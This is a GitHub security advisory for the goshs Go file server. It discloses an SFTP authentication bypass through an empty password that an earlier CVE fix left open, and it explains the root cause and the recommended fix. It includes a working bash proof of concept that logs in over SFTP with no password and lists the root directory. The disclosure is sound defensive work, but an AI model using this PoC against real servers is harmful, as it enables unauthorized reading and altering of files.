# [C] goshs SFTP authentication bypass via empty password (incomplete fix of CVE-2026-40884)

## Summary
Severity: Critical
Advisory: GHSA-rjrw-mjq6-hpmm
CVE: CVE-2026-62325
CWE: CWE-306
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-07-28
Source: https://github.com/advisories/GHSA-rjrw-mjq6-hpmm
Type: github-advisory

## Affected
- Go: `github.com/patrickhener/goshs/v2` — affected >=2.1.3 <2.1.4
- Go: `goshs.de/goshs/v2` — affected >=2.1.3 <2.1.4

## Details
## Summary

Start goshs v2.1.3 with `-b 'admin:' -sftp`. No `-fkf`. SFTP accepts connections without password. CVE-2026-40884 blocks the empty-username variant (`-b ':pass'`). The empty-password variant bypasses that fix.

## CVE-2026-40884

**CVE-2026-40884** (GHSA-c29w-qq4m-2gcv, Apr 13 2026) reported the empty-username case: `-b ':pass'` with `-sftp`. `sftpserver.go:85` uses `&&`:

```go
if s.Username != "" && s.Password != "" {
    sshServer.PasswordHandler = func(ctx ssh.Context, password string) bool {
        return subtle.ConstantTimeCompare([]byte(ctx.User()), []byte(s.Username)) == 1 && subtle.ConstantTimeCompare([]byte(password), []byte(s.Password)) == 1
    }
}
```

Empty username → `Username != ""` false → `PasswordHandler` nil. No `-fkf` means `PublicKeyHandler` also nil. gliderlabs/ssh sees all handlers nil and sets `NoClientAuth = true`. Unauthenticated access.

Patrickhener fixed it with a sanity check at `sanity/checks.go:114-118`:

```go
if opts.FTP && opts.FTPSFTPMode && strings.HasPrefix(opts.BasicAuth, ":") {
    logger.Fatal("When using SFTP with password authentication, the username cannot be empty. ...")
}
```

`HasPrefix(":")` catches empty username. It does not catch empty password.

## Empty Password Bypass

Same `&&` at `sftpserver.go:85`. Same nil handler. Different input:

```
goshs -b 'admin:' -sftp
```

- `Username = "admin"`, `Password = ""`
- `Username != "" && Password != ""` → false. Password is empty.
- `PasswordHandler` not set. No `-fkf` → `PublicKeyHandler` not set.
- gliderlabs/ssh → `NoClientAuth = true`.

CVE-2026-40884 patched the symptom (empty username) with input validation. Root cause (`&&`) stayed in the code. v2.1.3 still has it. That makes any unanticipated input format exploitable.

## PoC

```bash
#!/usr/bin/env bash
set -euo pipefail

HOST="${1:-127.0.0.1}"
PORT="${2:-2121}"

echo "[*] Connecting to goshs SFTP at $HOST:$PORT with empty password..."
echo "ls -la /" | sftp -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o PreferredAuthentications=none,password \
  -o PubkeyAuthentication=no \
  -P "$PORT" -b - admin@"$HOST" 2>&1 && \
  echo "[+] VULNERABLE: Connected without password!" || \
  echo "[-] Connection failed (patched or not running)"
```

## Root Cause

```go
// Wrong: &&
if s.Username != "" && s.Password != "" {

// Correct: ||
if s.Username != "" || s.Password != "" {
```

`&&` blocks `PasswordHandler` when either field is empty. `||` installs it when either field is set.

## Incomplete Fix

Patrickhener added `HasPrefix(":")` at `sanity/checks.go:116`. Two gaps remain:

1. `&&` still at `sftpserver.go:85` in v2.1.3
2. No `HasSuffix(":")` check for empty password

## Impact

- Unauthenticated SFTP file access (read, write, delete, rename)
- Same impact as CVE-2026-40884 via a different input
- Exploitable with `-b 'user:'` and no `-fkf`

## Affected

All goshs versions including v2.1.3. CVE-2026-40884 fix does not cover this variant.

## Recommended Fix

1. `&&` → `||` at `sftpserver/sftpserver.go:85`
2. `HasSuffix(":")` check at `sanity/checks.go`
3. Shared auth handler setup for HTTP and SFTP code paths

## References
- https://github.com/goshs-labs/goshs/security/advisories/GHSA-rjrw-mjq6-hpmm
- https://github.com/goshs-labs/goshs/commit/32f4a0e1790a709f722d0f3b2341f139d003180a
- https://github.com/goshs-labs/goshs
- https://github.com/goshs-labs/goshs/releases/tag/v2.1.4
